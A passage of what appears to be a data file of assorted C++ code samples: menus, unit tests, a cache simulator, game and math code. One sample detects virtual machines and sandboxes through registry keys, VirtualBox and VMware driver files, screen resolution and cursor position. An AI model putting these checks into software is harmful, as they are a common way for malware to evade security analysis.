Product Management\\n\";\n            cout << \"3. Logout\\n\";\n            choice = DataValidInput::getIntInput(\"Enter your choice: \");\n            switch (choice) {\n                case CUSTOMER: {\n                    CustomerApplication customerApp;\n                    customerApp.run();\n                    break;\n                }\n                case PRODUCT:\n                    ProductApplication productApp;\n                    productApp.run();\n                    break;\n                case EXIT:\n                    menu();\n                    break;\n                default:\n                    cout << \"Invalid input\" << endl;\n                    cout << \"\\a\";\n            }\n        } while (choice != EXIT);\n    }\n\n    void userMenu() {\n        int choice;\n        do {\n            DataValidInput::SetColor(15);\n            cout << \"\\t||- *************** -||\\n\";\n            cout << \"\\t       User Menu\\n\";\n            cout << \"\\t||- *************** -||\\n\";\n            cout << \"\\n1. View Customer\\n\";\n            cout << \"2. View Product\\n\";\n            cout << \"3. Logout\\n\";\n            cout << \"Enter choice: \";\n            cin >> choice;\n\n            switch (choice) {\n                case 1:\n                    customermanager.viewCustomers();\n                    system(\"cls\");\n                    break;\n                case 2:\n                    productmanager.viewProducts();\n                    system(\"cls\");\n                ",
    "#include \"pch.h\"\n#include \"../0703_BaseballKATA/Baseball.cpp\"\n\nusing namespace std;\n\nclass BaseballFixture :public testing::Test {\npublic:\n\tBaseball game{ \"123\" };\n\tvoid assertIllegalArgument(string guessNumber) {\n\t\ttry {\n\t\t\tgame.guess(guessNumber);\n\t\t\tFAIL();\n\t\t}\n\t\tcatch (exception e) {\n\t\t\t//pass\n\t\t}\n\t}\n};\n\nTEST_F(BaseballFixture, throwExceptionWhenInvalidCase) {\n\tassertIllegalArgument(\"12\");\n\tassertIllegalArgument(\"12s\");\n\tassertIllegalArgument(\"121\");\n}\n\nTEST_F(BaseballFixture, ReturnSolveResultIfMatchedNumber) {\n\tGuessResult result = game.guess(\"123\");\n\n\tEXPECT_TRUE(result.solved);\n\tEXPECT_EQ(3, result.strikes);\n\tEXPECT_EQ(0, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolveResult2S0B) {\n\tGuessResult result = game.guess(\"128\");\n\n\tEXPECT_TRUE(result.solved == false);\n\tEXPECT_EQ(2, result.strikes);\n\tEXPECT_EQ(0, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolveResult1S2B) {\n\tGuessResult result = game.guess(\"132\");\n\n\tEXPECT_TRUE(result.solved == false);\n\tEXPECT_EQ(1, result.strikes);\n\tEXPECT_EQ(2, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolveResult0S0B) {\n\tGuessResult result = game.guess(\"789\");\n\tEXPECT_TRUE(result.solved == false);\n\tEXPECT_EQ(0, result.strikes);\n\tEXPECT_EQ(0, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolveResult0S3B) {\n\tGuessResult result = game.guess(\"312\");\n\tEXPECT_TRUE(result.solved == false);\n\tEXPECT_EQ(0, result.strikes);\n\tEXPECT_EQ(3, result.balls);\n}\n\n\n",
    "#include \"memoryhierarchy.h\"\n\nCache::Cache(int size, int blockSize, ReplacementPolicy policy)\n    : size(size), blockSize(blockSize), policy(policy) {}\n\nbool Cache::accessMemory(int address) {\n    int blockAddress = address / blockSize;\n    if (cache.find(blockAddress) != cache.end()) {\n        // Hit\n        hits++;\n        if (policy == LRU) {\n            accessOrder.erase(std::remove(accessOrder.begin(), accessOrder.end(), blockAddress), accessOrder.end());\n            accessOrder.push_back(blockAddress);\n        }\n        return true;\n    } else {\n        // Miss\n        misses++;\n        replace(blockAddress);\n        return false;\n    }\n}\n\nvoid Cache::replace(int address) {\n    if (cache.size() >= size / blockSize) {\n        int evictAddress;\n        if (policy == FIFO) {\n            evictAddress = accessOrder.front();\n            accessOrder.pop_front();\n        } else if (policy == LRU) {\n            evictAddress = accessOrder.front();\n            accessOrder.pop_front();\n        } else if (policy == RR) {\n            evictAddress = cache.begin()->first;\n        }\n        cache.erase(evictAddress);\n    }\n    cache[address] = address;\n    accessOrder.push_back(address);\n}\n\nMemoryHierarchy::MemoryHierarchy(int l1Size, int l2Size, int l3Size, int blockSize, Cache::ReplacementPolicy policy)\n    : l1Cache(l1Size, blockSize, policy), l2Cache(l2Size, blockSize, policy), l3Cache(l3Size, blockSize, policy) {}\n\nbool MemoryHierarchy::accessMemory(int address) {\n    auto start = std::chrono::high_resolution_clock::now();\n\n    if (l1Cache.accessMemory(address)) {\n        auto end = std::chrono::high_resolution_clock::now();\n        std::chrono::duration<double, std::micro> elapsed = end - start;\n        totalAccessTime += elapsed.count();\n        numAccesses++;\n        return true;\n    }\n\n    if (l2Cache.accessMemory(address)) {\n        auto end = std::chrono::high_resolution_clock::now();\n        std::chrono::duration<double, std::micro> elapsed = end - start;\n        totalAccessTime += elapsed.count();\n        numAccesses++;\n        return true;\n    }\n\n    if (l3Cache.accessMemory(address)) {\n        auto end = std::chrono::high_resolution_clock::now();\n        std::chrono::duration<double, std::micro> elapsed = end - start;\n        totalAccessTime += elapsed.count();\n        numAccesses++;\n        return true;\n    }\n\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double, std::micro> elapsed = end - start;\n    totalAccessTime += elapsed.count();\n    numAccesses++;\n    return false;\n}\n",
    "#include <windows.h>\n#include <iostream>\n#include <vector>\n#include <string>\n\nbool IsVirtualMachine() {\n    const std::vector<std::pair<HKEY, std::wstring>> registryChecks = {\n        {HKEY_LOCAL_MACHINE, L\"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\"},\n        {HKEY_LOCAL_MACHINE, L\"HARDWARE\\\\Description\\\\System\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Control\\\\SystemInformation\"},\n        {HKEY_LOCAL_MACHINE, L\"HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__\"},\n        {HKEY_LOCAL_MACHINE, L\"HARDWARE\\\\ACPI\\\\FADT\\\\VBOX__\"},\n        {HKEY_LOCAL_MACHINE, L\"HARDWARE\\\\ACPI\\\\RSDT\\\\VBOX__\"},\n        {HKEY_LOCAL_MACHINE, L\"SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxGuest\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxMouse\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxService\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxSF\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\ControlSet001\\\\Services\\\\VBoxVideo\"},\n        {HKEY_LOCAL_MACHINE, L\"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"},\n        {HKEY_LOCAL_MACHINE, L\"SOFTWARE\\\\Wine\"},\n        {HKEY_LOCAL_MACHINE, L\"SOFTWARE\\\\Microsoft\\\\Virtual Machine\\\\Guest\\\\Parameters\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\CurrentControlSet\\\\Enum\\\\IDE\"},\n        {HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\CurrentControlSet\\\\Enum\\\\SCSI\"}\n    };\n\n    for (const auto& regCheck : registryChecks) {\n        HKEY hKey;\n        if (RegOpenKeyExW(regCheck.first, regCheck.second.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {\n            RegCloseKey(hKey);\n            return true;\n        }\n    }\n\n    const std::vector<std::wstring> fileChecks = {\n        L\"system32\\\\drivers\\\\VBoxMouse.sys\",\n        L\"system32\\\\drivers\\\\VBoxGuest.sys\",\n        L\"system32\\\\drivers\\\\VBoxSF.sys\",\n        L\"system32\\\\drivers\\\\VBoxVideo.sys\",\n        L\"system32\\\\vboxdisp.dll\",\n        L\"system32\\\\vboxhook.dll\",\n        L\"system32\\\\vboxmrxnp.dll\",\n        L\"system32\\\\vboxogl.dll\",\n        L\"system32\\\\vboxoglarrayspu.dll\",\n        L\"system32\\\\vboxoglcrutil.dll\",\n        L\"system32\\\\vboxoglerrorspu.dll\",\n        L\"system32\\\\vboxoglfeedbackspu.dll\",\n        L\"system32\\\\vboxoglpackspu.dll\",\n        L\"system32\\\\vboxoglpassthroughspu.dll\",\n        L\"system32\\\\vboxservice.exe\",\n        L\"system32\\\\vboxtray.exe\",\n        L\"system32\\\\VBoxControl.exe\",\n        L\"system32\\\\drivers\\\\vmmouse.sys\",\n        L\"system32\\\\drivers\\\\vmhgfs.sys\",\n        L\"system32\\\\drivers\\\\vm3dmp.sys\",\n        L\"system32\\\\drivers\\\\vmci.sys\",\n        L\"system32\\\\drivers\\\\vmhgfs.sys\",\n        L\"system32\\\\drivers\\\\vmmemctl.sys\",\n        L\"system32\\\\drivers\\\\vmmouse.sys\",\n        L\"system32\\\\drivers\\\\vmrawdsk.sys\",\n        L\"system32\\\\drivers\\\\vmusbmouse.sys\"\n    };\n\n    for (const auto& fileCheck : fileChecks) {\n        if (GetFileAttributesW(fileCheck.c_str()) != INVALID_FILE_ATTRIBUTES) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nbool IsSandboxByResolution() {\n    int screenWidth = GetSystemMetrics(SM_CXSCREEN);\n    int screenHeight = GetSystemMetrics(SM_CYSCREEN);\n\n    const int sandboxResolutions[][2] = {\n        {1024, 768},\n        {800, 600},\n        {640, 480}\n    };\n\n    for (const auto& resolution : sandboxResolutions) {\n        if (screenWidth == resolution[0] && screenHeight == resolution[1]) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nbool IsSandboxByMouseMovement() {\n    POINT pt;\n    GetCursorPos(&pt);\n    if (pt.x == 0 && pt.y == 0) {\n        return true;\n    }\n    return false;\n}\n\nbool IsVirtualDisk() {\n    HANDLE hDevice = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);\n    if (hDevice == INVALID_HANDLE_VALUE) {\n        std::cerr << \"Failed to open device.\" << std::endl;\n        return false;\n    }\n\n    STORAGE_PROPERTY_QUERY storagePropertyQuery;\n    DWORD bytesReturned;\n    char buffer[10000];\n\n    memset(&storagePropertyQuery, 0, sizeof(STORAGE_PROPERTY_QUERY));\n    storagePropertyQuery.PropertyId = StorageDeviceProperty;\n    storagePropertyQuery.QueryType = PropertyStandardQuery;\n\n    if (DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),\n        &buffer, sizeof(buffer), &bytesReturned, NULL)) {\n        STORAGE_DEVICE_DESCRIPTOR* deviceDescriptor = (STORAGE_DEVICE_DESCRIPTOR*)buffer;\n        char vendorId[256] = { 0 };\n        char productId[256] = { 0 };\n\n        if (deviceDescriptor->VendorIdOffset != 0) {\n            strcpy_s(vendorId, sizeof(vendorId), buffer + deviceDescriptor->VendorIdOffset);\n        }\n        if (deviceDescriptor->ProductIdOffset != 0) {\n            strcpy_s(productId, sizeof(productId), buffer + deviceDescriptor->ProductIdOffset);\n        }\n\n        std::cout << \"Vendor ID: \" << vendorId << std::",
    "//\n// Created by max on 01.07.24.\n//\n\n#include \"Player.h\"\n\n#include \"LTexture.h\"\n\nPlayer::Player()\n{\n    //Initialize the offsets\n    mPosX = 0;\n    mPosY = 0;\n\n    //Initialize the velocity\n    mVelX = 0;\n    mVelY = 0;\n}\n\nvoid Player::handleEvent( SDL_Event& e )\n{\n    //If a key was pressed\n    if( e.type == SDL_KEYDOWN && e.key.repeat == 0 )\n    {\n        //Adjust the velocity\n        switch( e.key.keysym.sym )\n        {\n            case SDLK_UP: mVelY -= PLAYER_VEL; break;\n            case SDLK_DOWN: mVelY += PLAYER_VEL; break;\n            case SDLK_LEFT: mVelX -= PLAYER_VEL; break;\n            case SDLK_RIGHT: mVelX += PLAYER_VEL; break;\n        }\n    }\n        //If a key was released\n    else if( e.type == SDL_KEYUP && e.key.repeat == 0 )\n    {\n        //Adjust the velocity\n        switch( e.key.keysym.sym )\n        {\n            case SDLK_UP: mVelY += PLAYER_VEL; break;\n            case SDLK_DOWN: mVelY -= PLAYER_VEL; break;\n            case SDLK_LEFT: mVelX += PLAYER_VEL; break;\n            case SDLK_RIGHT: mVelX -= PLAYER_VEL; break;\n        }\n    }\n}\n\nvoid Player::move()\n{\n    //Move the Player left or right\n    mPosX += mVelX;\n\n    //If the Player went too far to the left or right\n    if( ( mPosX < 0 ) || ( mPosX + PLAYER_WIDTH > SCREEN_WIDTH ) )\n    {\n        //Move back\n        mPosX -= mVelX;\n    }\n\n    //Move the Player up or down\n    mPosY += mVelY;\n\n    //If the Player went too far up or down\n    if( ( mPosY < 0 ) || ( mPosY + PLAYER_HEIGHT > SCREEN_HEIGHT ) )\n    {\n        //Move back\n        mPosY -= mVelY;\n    }\n}\n\nvoid Player::render(LTexture &gPlayerTexture,Renderer* gRenderer)\n{\n    //Show the player\n    gPlayerTexture.render( mPosX, mPosY,nullptr,0.0,nullptr,SDL_FLIP_NONE,gRenderer );\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"her_shield\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cmath>\n#include <iomanip>\n\nusing namespace std;\n\nstruct Dot {\n    float x;\n    float y;\n    float z;\n\n    Dot(float x, float y, float z) : x(x), y(y), z(z) {}\n};\n\nfloat distance(const Dot& a, const Dot& b, bool is3D = true) {\n    if (is3D) {\n        return sqrt(pow(b.x - a.x, 2) + pow(b.y - a.y, 2) + pow(b.z - a.z, 2));\n    } else {\n        return sqrt(pow(b.x - a.x, 2) + pow(b.y - a.y, 2));\n    }\n}\n\nDot sum(const Dot& a, const Dot& b, bool is3D = true) {\n    if (is3D) {\n        return Dot(a.x + b.x, a.y + b.y, a.z + b.z);\n    } else {\n        return Dot(a.x + b.x, a.y + b.y, 0);\n    }\n}\n\nDot sumArray(Dot dots[], int n, bool is3D = true) {\n    Dot result(0, 0, 0);\n    for (int i = 0; i < n; i++) {\n        result = sum(result, dots[i], is3D);\n    }\n    return result;\n}\n\nfloat dotProduct(const Dot& a, const Dot& b, bool is3D = true) {\n    if (is3D) {\n        return a.x * b.x + a.y * b.y + a.z * b.z;\n    } else {\n        return a.x * b.x + a.y * b.y;\n    }\n}\n\nDot crossProduct(const Dot& a, const Dot& b) {\n    return Dot(a.y * b.z - a.z * b.y, a.z * b.x - a.x * b.z, a.x * b.y - a.y * b.x);\n}\n\nvoid printVector(const Dot& v) {\n    cout << \"u = \" << fixed << setprecision(2) << v.x << \"i + \" \n         << fixed << setprecision(2) << v.y << \"j + \" \n         << fixed << setprecision(2) << v.z << \"k\\n\";\n\n    if (v.x != 0 && v.y != 0 && v.z != 0) {\n        cout << \"Plano XYZ\\n\";\n    } else if (v.x != 0 && v.y != 0) {\n        cout << \"Plano XY\\n\";\n    } else if (v.x != 0 && v.z != 0) {\n        cout << \"Plano XZ\\n\";\n    } else if (v.y != 0 && v.z != 0) {\n        cout << \"Plano YZ\\n\";\n    } else if (v.x != 0) {\n        cout << \"Eje X\\n\";\n    } else if (v.y != 0) {\n        cout << \"Eje Y\\n\";\n    } else if (v.z != 0) {\n        cout << \"Eje Z\\n\";\n    }\n}\n\nvoid solveForces(Dot forces[], int n) {\n    Dot resultant = sumArray(forces, n);\n    printVector(resultant);\n}\n\nint main() {\n    Dot a(1, 2, 3);\n    Dot b(4, 5, 6);\n    \n    cout << \"Distancia 2D: \" << distance(a, b, false) << \"\\n\";\n    cout << \"Distancia 3D: \" << distance(a, b) << \"\\n\";\n\n    Dot sumResult = sum(a, b);\n    cout << \"Suma de vectores: \";\n    printVector(sumResult);\n\n    Dot vectors[] = {a, b, Dot(7, 8, 9)};\n    int n = sizeof(vectors) / sizeof(vectors[0]);\n    Dot sumArrayResult = sumArray(vectors, n);\n    cout << \"Suma de arreglo de vectores: \";\n    printVector(sumArrayResult);\n\n    cout << \"Producto escalar 2D: \" << dotProduct(a, b, false) << \"\\n\";\n    cout << \"Producto escalar 3D: \" << dotProduct(a, b) << \"\\n\";\n\n    Dot crossResult = crossProduct(a, b);\n    cout << \"Producto cruz: \";\n    printVector(crossResult);\n\n    cout << \"Resolviendo sistema de fuerzas:\\n\";\n    solveForces(vectors, n);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <limits>\n#include \"Checker/errors.h\"\n#include \"Arrays/array_set.h\"\n#include \"Tests/tests_dynamic_array.h\"\n#include \"Tests/tests_array_sequence.h\"\n#include \"Tests/tests_linked_list.h\"\n#include \"Tests/tests_list_sequence.h\"\n#include \"Tests/tests_array_set.h\"\n#include \"classes/Chars.h\"\n#include \"Arrays/MutDynamicArray.h\"\n\n\nusing namespace std;\nint getInputInRange(int min, int max) {\n    int choice;\n    while (true) {\n        cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 (\" << min << \"-\" << max << \"): \";\n        cin >> choice;\n        if (cin.fail()) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u0432\u0432\u043e\u0434\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            cout << \"\u041e\u0448\u0438\u0431\u043a\u0430: \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0446\u0435\u043b\u043e\u0435 \u0447\u0438\u0441\u043b\u043e.\\n\";\n        } else if (choice < min || choice > max) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0439 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\n            cout << \"\u041e\u0448\u0438\u0431\u043a\u0430: \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e \u0438\u0437 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430.\\n\";\n        } else {\n            break;\n        }\n    }\n    return choice;\n}\n\nvoid testChars() {\n    Chars charObj;\n    int choice;\n    string input;\n\n    while (true) {\n        cout << \"\\n--- \u0422\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 Chars ---\\n\";\n        cout << \"1. \u0412\u0432\u0435\u0441\u0442\u0438 \u0441\u0442\u0440\u043e\u043a\u0443\\n\";\n        cout << \"2. \u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u0441\u0442\u0440\u043e\u043a\u0443\\n\";\n        cout << \"3. \u0421\u0440\u0430\u0432\u043d\u0438\u0442\u044c \u0441 \u0434\u0440\u0443\u0433\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u043e\u0439\\n\";\n        cout << \"4. \u0412\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\n\";\n\n        choice = getInputInRange(1, 4);\n        Chars other;\n        switch (choice) {\n            case 1:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443: \";\n                cin >> input;\n                charObj = Chars(input);\n                cout << \"\u0421\u0442\u0440\u043e\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430.\\n\";\n                break;\n            case 2:\n                cout << \"\u0422\u0435\u043a\u0443\u0449\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430: \" << charObj << endl;\n                break;\n            case 3:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 \u0434\u043b\u044f \u0441\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f: \";\n                cin >> input;\n                other = Chars(input);\n                if (charObj == other) {\n                    cout << \"\u0421\u0442\u0440\u043e\u043a\u0438 \u0440\u0430\u0432\u043d\u044b.\\n\";\n                } else {\n                    cout << \"\u0421\u0442\u0440\u043e\u043a\u0438 \u043d\u0435 \u0440\u0430\u0432\u043d\u044b.\\n\";\n                }\n                break;\n            case 4:\n                return;\n        }\n    }\n}\n\nvoid testComplexNumber() {\n    ComplexNumber complexObj;\n    int choice;\n    double re, im;\n\n    while (true) {\n        cout << \"\\n--- \u0422\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 ComplexNumber ---\\n\";\n        cout << \"1. \u0412\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\\n\";\n        cout << \"2. \u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\\n\";\n        cout << \"3. \u0421\u0440\u0430\u0432\u043d\u0438\u0442\u044c \u0441 \u0434\u0440\u0443\u0433\u0438\u043c \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u044b\u043c \u0447\u0438\u0441\u043b\u043e\u043c\\n\";\n        cout << \"4. \u0412\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\n\";\n\n        choice = getInputInRange(1, 4);\n        ComplexNumber other;\n        switch (choice) {\n            case 1:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0447\u0430\u0441\u0442\u044c: \";\n                cin >> re;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043c\u043d\u0438\u043c\u0443\u044e \u0447\u0430\u0441\u0442\u044c: \";\n                cin >> im;\n                complexObj = ComplexNumber(re, im);\n                cout << \"\u041a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u043e.\\n\";\n                break;\n            case 2:\n                cout << \"\u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \" << complexObj << endl;\n                break;\n            case 3:\n\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0447\u0430\u0441\u0442\u044c \u0434\u043b\u044f \u0441\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f: \";\n                cin >> re;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043c\u043d\u0438\u043c\u0443\u044e \u0447\u0430\u0441\u0442\u044c \u0434\u043b\u044f \u0441\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f: \";\n                cin >> im;\n                other = ComplexNumber(re, im);\n                if (complexObj == other) {\n                    cout << \"\u041a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430 \u0440\u0430\u0432\u043d\u044b.\\n\";\n                } else {\n                    cout << \"\u041a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430 \u043d\u0435 \u0440\u0430\u0432\u043d\u044b.\\n\";\n                }\n                break;\n            case 4:\n                return;\n        }\n    }\n}\n\nvoid testDynamicArray() {\n    DynamicArray<int> dynamicArray;\n    int choice, index, element;\n\n    while (true) {\n        cout << \"\\n--- \u0422\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 DynamicArray ---\\n\";\n        cout << \"1. \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\\n\";\n        cout << \"2. \u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043f\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0443\\n\";\n        cout << \"3. \u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043f\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0443\\n\";\n        cout << \"4. \u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u0440\u0430\u0437\u043c\u0435\u0440 \u0438 \u0451\u043c\u043a\u043e\u0441\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432\u0430\\n\";\n        cout << \"5. \u0412\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\n\";\n\n        choice = getInputInRange(1, 6);\n        int result;\n        switch (choice) {\n            case 1:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f: \";\n                cin >> element;\n                dynamicArray.Append(element);\n                cout << \"\u042d\u043b\u0435\u043c\u0435\u043d\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d.\\n\";\n                break;\n            case 2:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043d\u0434\u0435\u043a\u0441 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\n                cin >> index;\n                result = dynamicArray.GetElement(index);\n                cout << \"\u042d\u043b\u0435\u043c\u0435\u043d\u0442 \u043f\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0443 \" << index << \": \" << result << endl;\n\n                break;\n            case 3:\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043d\u0434\u0435\u043a\u0441 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\n                cin >> index;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430: \";\n                cin >> element;\n                dynamicArray.Replace(element, index);\n                cout << \"\u042d\u043b\u0435\u043c\u0435\u043d\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0451\u043d.\\n\";\n                break;\n            case 4:\n                cout << \"\u0420\u0430\u0437\u043c\u0435\u0440 \u043c\u0430\u0441\u0441\u0438\u0432\u0430",
    "/**\n * 88. Merge Sorted Array\n * \n * You are given two integer arrays 'p_numbersOne' and 'p_numbersTwo', sorted in non - decreasing order,\n * and two integers 'p_lengthOne' and 'p_lengthTwo', representing the number of elements in\n * 'p_numbersOne' and 'p_numbersTwo' respectively.\n * \n * Merge 'p_numbersOne' and 'p_numbersTwo' into a single array sorted in non-decreasing order.\n * \n * The final sorted array should not be returned by the function, but instead be stored inside the array 'p_numbersOne'.\n * To accommodate this, 'p_numbersOne' has a length of 'p_lengthOne' + 'p_lengthTwo',\n * where the first 'p_lengthOne' elements denote the elements that should be merged,\n * and the last 'p_lengthTwo' elements are set to 0 and should be ignored. 'p_numbersTwo' has a length of 'p_lengthTwo'.\n *\n */\n\n#include <vector>\n#include <iostream>\n\nvoid merge(std::vector<int>& p_numbersOne, int p_lengthOne, std::vector<int>& p_numbersTwo, int p_lengthTwo)\n{\n    // special case\n    if (p_numbersTwo.size() == 0) {\n        return;\n    }\n\n    size_t indexOne = 0;\n    size_t indexTwo = 0;\n\n    // 